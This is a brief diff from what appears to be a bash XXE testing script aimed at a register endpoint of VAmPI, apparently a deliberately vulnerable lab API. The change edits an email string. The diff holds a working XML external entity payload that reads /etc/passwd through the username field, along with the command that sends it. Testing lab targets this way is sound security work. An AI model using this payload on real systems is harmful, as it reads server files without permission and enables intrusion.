@@ -27,7 +27,7 @@ send_xxe() {
 }
 
 # --- Payload 1: Classic /etc/passwd exfiltration ---
-XXE_PASSWD='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><username>&xxe;</username><password>test</password><email>xxe@evil.example</email></user>'
+XXE_PASSWD='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><username>&xxe;</username><password>test</password><email>xxe@example.com</email></user>'
 
 echo "[+] Payload 1: Classic XXE — file:///etc/passwd"
 send_xxe "${BASE}/vampi/users/v1/register" "application/xml" "$XXE_PASSWD" "vampi/register (application/xml)"
